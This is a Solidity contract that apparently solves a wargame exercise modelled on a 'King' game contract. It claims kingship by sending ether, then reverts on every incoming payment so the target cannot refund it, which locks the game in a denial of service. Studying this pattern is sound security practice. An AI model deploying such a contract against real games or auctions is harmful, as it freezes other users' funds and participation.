// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../prob/King/King.sol";

import "hardhat/console.sol";

contract MaliciousKing {
    constructor() payable {}

    // receive() external payable {}

    // reject all the ether transfer
    receive() external payable {
        revert("FAIL");
    }

    // player should call this function
    // with `msg.value > 0.001`
    function attack(address payable _target) public payable returns (bool) {
        King king = King(_target);

        // get King-Ship!
        (bool res, ) = address(king).call{value: msg.value}("");

        return res;
    }
}
